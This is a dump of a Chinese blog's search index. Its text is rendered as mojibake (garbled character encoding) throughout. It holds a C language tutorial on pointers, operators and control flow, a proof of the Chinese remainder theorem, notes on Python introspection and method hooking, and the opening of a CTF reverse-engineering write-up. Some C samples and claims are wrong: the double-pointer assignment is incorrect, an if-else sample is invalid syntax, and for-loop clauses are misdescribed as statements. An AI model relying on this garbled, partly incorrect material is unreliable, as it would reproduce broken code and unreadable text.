·ptræŒ‡å‘çš„åœ°å€å°±æ˜¯açš„åœ°å€ã€‚å¯¹*ptrè¿›è¡Œçš„æ“ä½œå°±æ˜¯å¯¹aè¿›è¡Œçš„æ“ä½œ</span></span><br></pre></td></tr></table></figure><p>ä¸éš¾çœ‹å‡ºï¼Œ*å’Œ&amp;æ˜¯ä¸¤ä¸ªäº’é€†çš„è¿ç®—ç¬¦ï¼Œ*æŠŠä¸€ä¸ªåœ°å€è½¬ä¸ºåœ°å€ä¸­çš„å€¼ï¼Œ&amp;æŠŠä¸€ä¸ªå€¼è½¬ä¸ºå¯¹åº”çš„åœ°å€ï¼Œå½“ç„¶ï¼Œ&amp;è¿ç®—ç¬¦ä½¿ç”¨çš„å‰ææ˜¯è¿™é‡Œè¦æœ‰è¿™ä¸ªç©ºé—´ï¼Œæ ‡è¯†ç¬¦è¡¨æ˜ä¸€ä¸ªç©ºé—´ï¼Œå› æ­¤å¯ä»¥ä½¿ç”¨&amp;æ ‡è¯†ç¬¦æ¥è·å–è¿™ä¸ªç©ºé—´çš„åœ°å€ï¼Œå•çº¯çš„ä¸€ä¸ªæ•°æ²¡æœ‰ç©ºé—´æ‰€ä»¥ä¸èƒ½&amp;1ã€‚</p><p>å¯ä»¥æ¥çœ‹çœ‹æŒ‡é’ˆå’Œæ™®é€šæ ‡è¯†ç¬¦çš„åŒºåˆ«åŠè”ç³»ï¼š</p><table><thead><tr><th></th><th>æ™®é€šæ ‡è¯†ç¬¦</th><th>æŒ‡é’ˆæ ‡è¯†ç¬¦</th></tr></thead><tbody><tr><td>é»˜è®¤è¡¨ç¤º</td><td>æ•°æ®</td><td>ç›®æ ‡åœ°å€</td></tr><tr><td>ä½¿ç”¨*</td><td>æ— æ•ˆ</td><td>æ•°æ®</td></tr><tr><td>ä½¿ç”¨&amp;</td><td>è‡ªèº«åœ°å€</td><td>è‡ªèº«åœ°å€</td></tr></tbody></table><p>å¯ä»¥ç†è§£ä¸ºï¼šæ™®é€šæ ‡è¯†ç¬¦æ˜¯é»˜è®¤ä¸ºå€¼çš„ï¼Œç”¨&amp;è·å–åœ°å€ï¼Œè€ŒæŒ‡é’ˆæ ‡è¯†ç¬¦æ˜¯é»˜è®¤ä¸ºåœ°å€çš„ï¼Œç”¨*è·å–å€¼ã€‚</p><p>ç°åœ¨å‡è®¾</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> a = <span class="number">0</span>;</span><br><span class="line"><span class="type">int</span> *ptr1 = &amp;a;</span><br><span class="line"><span class="type">int</span> **ptr2 = ptr1;</span><br></pre></td></tr></table></figure><p>æ ¹æ®ä¸Šé¢çš„è¡¨æ ¼å¯ä»¥å¾—å‡º</p><table><thead><tr><th></th><th>a</th><th>ptr1</th><th>ptr2</th></tr></thead><tbody><tr><td>é»˜è®¤è¡¨ç¤º</td><td>0</td><td>açš„åœ°å€</td><td>ptr1çš„åœ°å€</td></tr><tr><td>ä½¿ç”¨*</td><td>æ— æ•ˆæ•°æ®</td><td>0</td><td>ptr1çš„å€¼(å³açš„åœ°å€)</td></tr><tr><td>ä½¿ç”¨**</td><td>æ— æ•ˆæ•°æ®</td><td>æ— æ•ˆæ•°æ®</td><td>0</td></tr><tr><td>ä½¿ç”¨&amp;</td><td>açš„åœ°å€</td><td>ptr1çš„åœ°å€</td><td>ptr2çš„åœ°å€</td></tr></tbody></table><p>å¾ˆå¥½ç†è§£å§ã€‚</p><h3 id="02-è®¡ç®—">02 è®¡ç®—</h3><p>åŸºç¡€è¿ç®—ç¬¦ï¼Œè¿™é‡Œå°±åªè¯´æ˜ä¸€ä¸‹ï¼Œå…·ä½“å»ç½‘ç»œä¸Šæœç´¢</p><h4 id="1ç®—æ•°è¿ç®—ç¬¦">1ç®—æ•°è¿ç®—ç¬¦</h4><p>+,-,*,/,%ï¼Œç»“åˆæ€§å‡ä¸ºä»å·¦è‡³å³</p><p>è¿”å›å€¼ç±»å‹ä¸ºæ“ä½œæ•°çš„ç±»å‹ï¼ˆä¸ä¸€æ ·æŒ‰ç©ºé—´å¤§çš„è®¡ç®—ï¼‰ï¼Œè¿”å›å€¼ä¸ºæ•°å­¦è®¡ç®—å‡ºçš„å€¼</p><p>/å’Œ%å³æ“ä½œæ•°ä¸èƒ½ä¸º0ï¼Œå¦‚æœ/çš„æ“ä½œæ•°æœ‰ä¸€ä¸ªæ˜¯æµ®ç‚¹å‹ï¼Œç»“æœå°±æ˜¯æµ®ç‚¹å‹ï¼Œå¦åˆ™ä¸ºæ•´é™¤è¿ç®—.</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">5</span>/<span class="number">3</span></span><br><span class="line"><span class="comment">//ç»“æœä¸º1</span></span><br><span class="line"><span class="number">5.0</span>/<span class="number">3</span></span><br><span class="line"><span class="comment">//ç»“æœä¸º1.666666</span></span><br></pre></td></tr></table></figure><p>%çš„å·¦æ“ä½œæ•°å†³å®šè¿”å›å€¼ç±»å‹</p><p>Cè¯­è¨€çš„å–æ•´ä¸ºè¶‹é›¶æˆªæ–­ï¼Œå‡ºç°çš„æ‰€æœ‰å°æ•°å˜ä¸ºæ•´æ•°æ—¶å‘0å–æ•´</p><h4 id="2è‡ªå¢è¿ç®—ç¬¦">2è‡ªå¢è¿ç®—ç¬¦</h4><p>i++,++i,iâ€“,â€“iï¼Œå’Œæœ€è¿‘çš„ä¸€ä¸ªç»“åˆ</p><p>i++è¡¨æ˜å…ˆè¿ç®—å®Œè¿™ä¸ªè¯­å¥ï¼Œç„¶åæ‰§è¡Œi=i+1</p><p>++iè¡¨æ˜å…ˆæ‰§è¡Œi=i+1ï¼Œç„¶åè¿ç®—è¿™ä¸ªè¯­å¥</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">i=<span class="number">0</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,i++);<span class="comment">//0</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,i);<span class="comment">//1</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,--i);<span class="comment">//0</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,++i);<span class="comment">//1</span></span><br></pre></td></tr></table></figure><h4 id="3èµ‹å€¼è¿ç®—ç¬¦">3èµ‹å€¼è¿ç®—ç¬¦</h4><p>ç»“åˆæ€§ä»å³åˆ°å·¦</p><p>å¤åˆèµ‹å€¼</p><p>+=ï¼Œ-=ï¼Œ*=ï¼Œ/=ï¼Œ%=</p><p>a+=1è¡¨ç¤ºa=a+1åŒç†å…¶å®ƒçš„</p><h4 id="4å…³ç³»è¿ç®—ç¬¦">4å…³ç³»è¿ç®—ç¬¦</h4><p>è¿”å›å€¼å‡ä¸ºçœŸå‡ï¼ˆ0æˆ–1ï¼‰ï¼Œç»“åˆä»å·¦åˆ°å³</p><p>&lt;,&gt;,==,!=,&gt;=,&lt;=</p><p>åˆ†åˆ«ä¸ºæ˜¯å¦å°äºï¼Œæ˜¯å¦å¤§äºï¼Œæ˜¯å¦ç­‰äºï¼Œæ˜¯å¦ä¸ç­‰äºï¼Œæ˜¯å¦å¤§äºç­‰äºï¼Œæ˜¯å¦å°äºç­‰äº</p><p>æ³¨æ„==å’Œ=çš„åŒºåˆ«</p><h4 id="5é€»è¾‘è¿ç®—ç¬¦">5é€»è¾‘è¿ç®—ç¬¦</h4><p>a &amp;&amp; b æ˜¯å¦åŒæ—¶æˆç«‹</p><p>a || b æ˜¯å¦è‡³å°‘ä¸€ä¸ªæˆç«‹</p><p>!a æ˜¯å¦ä¸æˆç«‹</p><h4 id="6ä¸‰å…ƒè¿ç®—ç¬¦">6ä¸‰å…ƒè¿ç®—ç¬¦</h4><p>a?b:c</p><p>è¡¨ç¤ºaå¦‚æœä¸ä¸º0ï¼Œåˆ™è¿”å›ï¼ˆæ‰§è¡Œï¼‰ä¸ºbï¼Œå¦åˆ™è¿”å›ï¼ˆæ‰§è¡Œï¼‰cï¼Œè¿™é‡Œå†™æ‰§è¡Œæ˜¯æé†’å‰¯ä½œç”¨</p><h4 id="7ä½è¿ç®—ç¬¦">7ä½è¿ç®—ç¬¦</h4><p>&amp; æŒ‰ä½ä¸</p><p>| æŒ‰ä½æˆ–</p><p>~ æŒ‰ä½é</p><p>^ æŒ‰ä½å¼‚æˆ–</p><p>&lt;&lt; å·¦ç§»ï¼Œç©ºä½è¡¥0</p><p>&gt; &gt; å³ç§»ï¼Œå¦‚æœæœ‰ç¬¦å·ï¼Œè¡¥ç¬¦å·ï¼Œç§°ä¸ºç®—æ•°å³ç§»ï¼Œå¦åˆ™æ˜¯é€»è¾‘å³ç§»</p><p>ä»¥ä¸Šä¼˜å…ˆçº§è¡¨è¯·è‡ªè¡ŒæŸ¥çœ‹ï¼Œæ³¨æ„ä½è¿ç®—ç¬¦å’Œç®—æ•°è¿ç®—çš„ä¼˜å…ˆçº§å…³ç³»</p><p>å¥½äº†ï¼Œé€šè¿‡ä»¥ä¸Šå†…å®¹ï¼Œæˆ‘ä»¬å·²ç»å¯ä»¥æ“ä½œä¸€ä¸ªç©ºé—´è¿›è¡Œèµ‹å€¼å’Œè®¡ç®—äº†ï¼Œç„¶åå°±æ˜¯é¢å‘è¿‡ç¨‹çš„æ ¸å¿ƒï¼Œæ“ä½œè¿‡ç¨‹ï¼Œå³æ§åˆ¶ç¨‹åºçš„æ‰§è¡Œæµç¨‹ã€‚</p><h2 id="0x04-è¿‡ç¨‹æ§åˆ¶">0x04 è¿‡ç¨‹æ§åˆ¶</h2><p>é¢å‘è¿‡ç¨‹ä¸­åˆ†ä¸ºä¸‰ç§ç»“æ„ï¼šé¡ºåºï¼Œé€‰æ‹©ï¼Œå¾ªç¯</p><p>é¡ºåºå°±æ˜¯æŒ‡ä»¤ä¾æ¬¡æ‰§è¡Œä»ä¸Šåˆ°ä¸‹çš„ä¸€ç§ç»“æ„ï¼Œæ‰€æœ‰æŒ‡ä»¤æ‰§è¡Œä¸”åªæ‰§è¡Œä¸€æ¬¡ã€‚<br>é€‰æ‹©å°±æ˜¯æ ¹æ®æ¡ä»¶æ¥æ‰§è¡Œåˆ†æ”¯ä¸­ä»£ç çš„ç»“æ„ã€‚æŒ‡ä»¤æ‰§è¡Œ0æ¬¡æˆ–1æ¬¡ã€‚<br>å¾ªç¯å°±æ˜¯æ ¹æ®æ¡ä»¶å¤šæ¬¡é‡å¤æ‰§è¡Œä»£ç çš„ç»“æ„ã€‚æŒ‡ä»¤æ‰§è¡Œ0æ¬¡ï¼Œ1æ¬¡æˆ–å¤šæ¬¡ã€‚</p><p>ä½¿ç”¨ä¸Šé¢ä¸‰ç§ç»“æ„ä½¿å¾—æ‰€æœ‰ä»£ç å¯ä»¥æœ‰é€»è¾‘åœ°æ‰§è¡Œæˆ‘ä»¬æƒ³è®©å®ƒæ‰§è¡Œçš„æ¬¡æ•°ã€‚<br>ä¸€èˆ¬æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬ç”¨é¡ºåºç»“æ„åšè¿æ¥ï¼Œè®©é€‰æ‹©å’Œå¾ªç¯ç»“æ„åˆ†å—æ¥æ‰§è¡Œæˆ‘ä»¬çš„ç¨‹åºã€‚ç”±äºé¡ºåºç»“æ„å°±æ˜¯æ­£å¸¸çš„è¯­å¥ï¼Œæˆ‘ä»¬è¿™é‡Œç›´æ¥è·³è¿‡ã€‚</p><h3 id="01-é€‰æ‹©ç»“æ„">01 é€‰æ‹©ç»“æ„</h3><p>æˆ‘ä»¬ä¸€èˆ¬ä½¿ç”¨if/elseå’Œswitchæ¥å†™é€‰æ‹©ç»“æ„</p><p>if-else</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(x)&#123;<span class="comment">//å•if</span></span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ( x )&#123;<span class="comment">//if+else</span></span><br><span class="line">    <span class="comment">//xxx</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="comment">//xxx</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (x)&#123;<span class="comment">//if+else&#123;if+else&#125;</span></span><br><span class="line">    <span class="comment">//xxx</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">    <span class="keyword">if</span>(y)&#123;</span><br><span class="line">    <span class="comment">//xxx</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="comment">//xxx</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è‹¥ifæ‹¬å·ä¸­ä»»æ„å†…å®¹çš„è¿”å›å€¼ä¸ºé0åˆ™æ‰§è¡Œï¼Œå¦åˆ™è·³è¿‡ï¼Œå¦‚æœæœ‰elseå°±æ‰§è¡Œelseï¼Œå¦‚æœifæˆ–elseååªæœ‰ä¸€æ¡è¯­å¥åˆ™ä¸éœ€è¦å†™å¤§æ‹¬å·ï¼Œç”±äºifæœ¬èº«ä¹Ÿæ˜¯ä¸€æ¡è¯­å¥æ‰€ä»¥ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(a)</span><br><span class="line">    <span class="keyword">if</span>(b)</span><br><span class="line">        <span class="keyword">if</span>(c)</span><br><span class="line">            <span class="keyword">if</span>(d)</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;ä¸ç”¨å†™å¤§æ‹¬å·ï¼Œçˆ½ï¼&quot;</span>);</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;æˆ‘å’Œif(d)åŒ¹é…&quot;</span>);<span class="comment">//elseåªå’Œæœ€è¿‘çš„æœªåŒ¹é…çš„ifåŒ¹é…</span></span><br></pre></td></tr></table></figure><p>å› æ­¤ï¼Œif-else ifè¯­æ³•ä¹Ÿä¸éœ€è¦å®šä¹‰å¯ä»¥ç›´æ¥ä½¿ç”¨å› ä¸ºif elseæ•´ä¸ªæ˜¯ä¸€æ¡è¯­å¥</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (a)</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;hh&quot;</span>);</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(b)</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;ç¥å¥‡çš„&quot;</span>);</span><br></pre></td></tr></table></figure><p>å¦‚æœæˆ‘ä»¬è¦é€‰æ‹©çš„å†…å®¹æ˜¯ç¦»æ•£çš„ï¼Œå¯ä»¥ç›´æ¥æšä¸¾ï¼Œé‚£ä¹ˆä½¿ç”¨switchæ›´æ–¹ä¾¿</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">switch</span>(a)&#123;</span><br><span class="line">    <span class="keyword">case</span> x:<span class="comment">//å¦‚æœaçš„å€¼æ˜¯x</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;åŒ¹é…æˆåŠŸ&quot;</span>);</span><br><span class="line">    <span class="keyword">case</span> y:<span class="comment">//å¦‚æœaçš„å€¼æ˜¯y</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;åŒ¹é…æˆåŠŸ&quot;</span>);</span><br><span class="line">    <span class="keyword">case</span> z:</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:<span class="comment">//å¦‚æœä¸Šé¢çš„éƒ½ä¸æ˜¯ï¼Œé»˜è®¤</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°è¿™é‡Œæœ‰ä¸€ä¸ªæ–°è¯­æ³•å«åšcase :ï¼Œcè¯­è¨€ä¸­ï¼Œåªæœ‰ä¸¤ä¸ªåœ°æ–¹ä½¿ç”¨äº†å†’å·ï¼Œä¸€ä¸ªæ˜¯switchï¼Œä¸€ä¸ªæ˜¯gotoï¼Œå¯ä»¥æƒ³è±¡ï¼šå†’å·ç”¨äºç»™ä¸€ä¸ªè¯­å¥å¼€å¤´è´´æ ‡ç­¾ï¼Œè¯­å¥è·³è½¬æ—¶ï¼Œç›´æ¥è·³è½¬åˆ°è¿™ä¸ªæ ‡ç­¾çš„ä½ç½®ç»§ç»­æ‰§è¡Œè€Œä¸ä¼šè€ƒè™‘è¿™é‡Œæœ‰æ²¡æœ‰å…¶å®ƒæ ‡ç­¾ã€‚å› æ­¤å¦‚æœaçš„å€¼æ˜¯xï¼Œä¼šè¾“å‡ºä¸¤æ¬¡åŒ¹é…æˆåŠŸï¼Œå› ä¸ºå®ƒè·³è½¬åˆ°case xçš„æ ‡ç­¾å¤„ç»§ç»­æ‰§è¡Œã€‚é‚£ä¹ˆæœ‰ä»€ä¹ˆåŠæ³•å¯ä»¥é˜²æ­¢å¤šä¸ªæƒ…å†µè¢«åŒ¹é…åˆ°å‘¢ï¼Œè¿™é‡Œä½¿ç”¨äº†breakå…³é”®å­—æ¥è·³å‡ºè¿™ä¸ªå—ï¼Œä»è€Œç»“æŸäº†ç»§ç»­æ‰§è¡Œã€‚å› æ­¤ï¼Œå¯ä»¥åœ¨æ¯ä¸ªcaseæœ€åæ”¾ä¸€ä¸ªbreak;æ¥é˜²æ­¢ç»§ç»­æ‰§è¡Œåˆ°ä¸‹ä¸€ä¸ªåœ°æ–¹</p><h3 id="02-å¾ªç¯ç»“æ„">02 å¾ªç¯ç»“æ„</h3><p>å¦‚ä½•è®©ä¸€ä¸ªæ“ä½œå¤šæ¬¡æ‰§è¡Œå‘¢ï¼Œä½¿ç”¨å¾ªç¯ç»“æ„å§</p><p>åŸºæœ¬å¾ªç¯ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(init;check;cycle)&#123;</span><br><span class="line">    <span class="comment">//body</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è§£é‡Šä¸€ä¸‹forçš„å°æ‹¬å·é‡Œé¢çš„å†…å®¹ï¼š</p><p>ç¬¬ä¸€ä¸ªæ˜¯å¾ªç¯è¿›å…¥æ—¶æ‰§è¡Œçš„è¯­å¥ï¼Œcycleæ˜¯æ¯æ¬¡å¾ªç¯ç»“æŸæ—¶æ‰§è¡Œçš„è¯­å¥ï¼Œcheckæ˜¯æ¯æ¬¡è¿›å…¥å¾ªç¯å‰æ‰§è¡Œçš„è¯­å¥ï¼Œå¦‚æœè¿™ä¸ªè¯­å¥çš„æ¡ä»¶ä¸ºå¦å°±è·³å‡ºå¾ªç¯ï¼Œå¦åˆ™ä¸€ç›´å¾ªç¯ã€‚æ³¨æ„ï¼Œè¿™é‡Œçš„ä¸‰ä¸ªå†…å®¹å‡ä¸ºè¯­å¥ï¼Œä¸å¯ä»¥ç›´æ¥å†™è¡¨è¾¾å¼ï¼æ¯”å¦‚ï¼š1ã€‚ä½†æ˜¯å¯ä»¥ç•™ç©ºã€‚</p><p>é¡ºåºæ˜¯init-&gt;check-&gt;body-&gt;cycle-&gt;check-&gt;body-&gt;cycle-&gt;check-&gt;â€¦</p><p>whileå¾ªç¯</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span>(a)&#123;</span><br><span class="line"><span class="comment">//body</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">do</span>&#123;</span><br><span class="line">    <span class="comment">//body</span></span><br><span class="line">&#125;<span class="keyword">while</span>(a);</span><br></pre></td></tr></table></figure><p>è¿™é‡Œçš„aå¯ä»¥å†™ä»»æ„å†…å®¹ï¼Œåªæœ‰å½“å†…å®¹ä¸ä¸º0æ—¶æ‰ä¼šç»§ç»­æ‰§è¡Œï¼Œå¦åˆ™è·³å‡ºã€‚</p><h4 id="1æ§åˆ¶è¯­å¥">1æ§åˆ¶è¯­å¥</h4><p>æœ‰ä¸‰ä¸ªè¯­å¥å¯ä»¥ç”¨æ¥æ”¹å˜æ‰§è¡Œæµï¼š</p><ul><li>break;ï¼šç¦»å¼€å¾ªç¯ä½“æˆ–switchå—</li><li>continue;ï¼šè·³è¿‡è¿™ä¸ªè¯­å¥ä¹‹åçš„å†…å®¹ã€‚è¿›è¡Œä¸‹ä¸€æ¬¡å¾ªç¯</li><li>goto x;ï¼šè·³åˆ°xæ ‡ç­¾çš„ä½ç½®ï¼Œè®¾ç½®æ ‡ç­¾ç›´æ¥åœ¨å‡½æ•°å†…ä½¿ç”¨x:å°±å¯ä»¥åœ¨è¿™ä¸€è¡Œè®¾ç½®æ ‡ç­¾ã€‚</li></ul><p>ï¼ˆè¯­æ³•ç¯‡ç»“æŸï¼‰</p><hr>]]></content>
      
      
      <categories>
          
          <category> çŸ¥è¯†é›† </category>
          
          <category> å¼€å‘ </category>
          
          <category> è¯­è¨€å­¦ä¹  </category>
          
      </categories>
      
      
        <tags>
            
            <tag> è¯­è¨€ </tag>
            
            <tag> Cè¯­è¨€ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ä¸­å›½å‰©ä½™å®šç†è¯æ˜</title>
      <link href="/posts/891a7930.html"/>
      <url>/posts/891a7930.html</url>
      
        <content type="html"><![CDATA[<h3 id="å®šç†æè¿°">å®šç†æè¿°</h3><p><img src="https://s2.loli.net/2024/09/15/jIlf4DvczOoGa6k.png" alt="image-20240915202907787"></p><p>å‡è®¾è§£ä¸º<br>$$<br>x = \sum^k_{i=0}a_iN_im_i<br>$$<br>è§£é‡Šï¼š</p><p>è®¾$N_i = \frac{N}{n_i}$ï¼Œç”±äºæ¡ä»¶å·²çŸ¥näº’è´¨ï¼Œ<br>é‚£ä¹ˆæ ¹æ®$N_i$å’Œ$n_i$äº’è´¨å’Œè´ç¥–å®šç†<br>æ‰€ä»¥$N_im_i+n_ik_i=1$,è¿™é‡Œçš„må’Œkä¸ºä»»æ„å¯èƒ½çš„æ•´æ•°<br>è¿™ä¸ªå¼å­å·¦å³åŒæ¨¡$n_i$<br>å¯å¾—:<br>$$<br>N_im_i \equiv 1 \mod n_i<br>$$</p><hr><p>å¥½çš„ï¼Œå·²ç»æ¸…æ¥šxä¸­æ¯ä¸ªå­—æ¯çš„è¡¨ç¤ºäº†ï¼Œç»§ç»­</p><p>åœ¨$\mod n_i$çš„æƒ…å†µä¸‹ï¼Œ(è¿™é‡Œç”¨jé¿å…å’Œnæ··æ·†ï¼Œnçš„iæ˜¯ç¬¬iä¸ªï¼Œå‰é¢çš„sumæ˜¯å…¨éƒ¨å–å€¼ï¼Œjå¯ä»¥å–åˆ°i)<br>$$<br>x \equiv \sum^k_{j=0}a_jN_jm_j \mod n_i<br>$$</p><p>åˆå½“$N_j\not = N_i$æ—¶ï¼Œ$N_j \mod n_i=0$ï¼Œæ‰€ä»¥:<br>$$<br>x \equiv a_iN_im_i \mod n_i<br>$$<br>åˆå› ä¸º$N_im_i \equiv 1 \mod n_i$ï¼š<br>$$<br>x \equiv a_i \mod n_i<br>$$ç”±äºæ¯æ­¥å¯é€†ï¼Œå¾—è¯</p><hr><p>å”¯ä¸€æ€§è¯æ˜</p><p>è‹¥$x_1$å’Œ$x_2$å‡ä¸ºæ–¹ç¨‹çš„è§£ï¼Œé‚£ä¹ˆæ ¹æ®åŒä½™çš„å®šä¹‰<br>æœ‰$(x_1-x_2)|n_i$ï¼Œæ‰€ä»¥$(x_1-x_2)|lim(n_1,n_2,â€¦)$<br>æ‰€ä»¥$(x_1-x_2)|N$</p><p>æ‰€ä»¥$x_1 \equiv x_2 \mod N$<br>æ‰€ä»¥æœ€å¤šæœ‰ä¸€ä¸ªè§£å°äºN</p><p>å¾—è¯</p>]]></content>
      
      
      <categories>
          
          <category> å¯†ç å­¦ </category>
          
          <category> å®šç† </category>
          
      </categories>
      
      
        <tags>
            
            <tag> crt </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python-è¿è¡Œæ—¶è·å–ä¿¡æ¯</title>
      <link href="/posts/36f452d0.html"/>
      <url>/posts/36f452d0.html</url>
      
        <content type="html"><![CDATA[<h2 id="æ¨¡å—">æ¨¡å—</h2><p>åŸºæœ¬ä¿¡æ¯è·å–ï¼Œå¯¹ç±»åŒç†,è·å–å‡½æ•°ä¼ å‚ç”¨inspect</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="built_in">dir</span>(mod))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">help</span>(mod))</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> inspect</span><br><span class="line"><span class="built_in">print</span>(inspect.signature(obj.func1))</span><br></pre></td></tr></table></figure><p>å¯¹ç±»çš„å‡½æ•°è¿›è¡Œhook</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">setattr</span>(the_class,<span class="string">&#x27;true_func1&#x27;</span>,the_class.__dict__[<span class="string">&#x27;func1&#x27;</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hook_func1</span>(<span class="params">self,a,b</span>): <span class="comment"># æ”¹ä¸ºæ­£ç¡®çš„ä¼ å‚ï¼Œ</span></span><br><span class="line">Â  Â  <span class="built_in">print</span>(<span class="string">&quot;in func1&quot;</span>)</span><br><span class="line">Â  Â  <span class="built_in">print</span>(<span class="built_in">hex</span>(a),<span class="built_in">hex</span>(b))</span><br><span class="line">Â  Â  ret = self.true_func1(a,b)</span><br><span class="line">Â  Â  <span class="built_in">print</span>(<span class="built_in">hex</span>(ret))</span><br><span class="line"></span><br><span class="line"><span class="built_in">setattr</span>(the_class, <span class="string">&quot;func1&quot;</span>, hook_func1)</span><br></pre></td></tr></table></figure><h2 id="è¯»å–å†…å­˜">è¯»å–å†…å­˜</h2><p>pythonè¿›ç¨‹è¿è¡Œæ—¶æ˜¯ç”±pythonè§£é‡Šå™¨è¿è¡Œçš„ï¼Œå¯ä»¥ä½¿ç”¨CEé™„åŠ pythonè§£é‡Šå™¨è¯»å–å†…å­˜å†…å®¹ï¼Œæ•ˆæœå’Œæ­£å¸¸ä½¿ç”¨CEç›¸åŒ</p>]]></content>
      
      
      <categories>
          
          <category> çŸ¥è¯†é›† </category>
          
          <category> é€†å‘ </category>
          
          <category> è¯­è¨€ </category>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pythoné€†å‘ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>é•¿åŸæ¯2024å¤ç°</title>
      <link href="/posts/84d382e7.html"/>
      <url>/posts/84d382e7.html</url>
      
        <content type="html"><![CDATA[<h3 id="easyre">easyre</h3><p>ä¸è§£é‡Šäº†ï¼Œ42ä½é€ä½å¼‚æˆ–</p><p>æœ‰äº›åç¼–è¯‘å¾ˆæ€ªçš„[aÂ±k *(b/k)]è¿™ä¸ªç›¸å½“äº[(a+b) mod len]</p><p>è€Œç±»ä¼¼</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( _mm_movemask_epi8(</span><br><span class="line">       _mm_and_si128(</span><br><span class="line">         _mm_cmpeq_epi8(_mm_loadu_si128(v3), (__m128i)xmmword_140021410),</span><br><span class="line">         _mm_cmpeq_epi8(_mm_loadu_si128(v3 + <span class="number">1</span>), (__m128i)xmmword_140021400))) == <span class="number">0xFFFF</span> 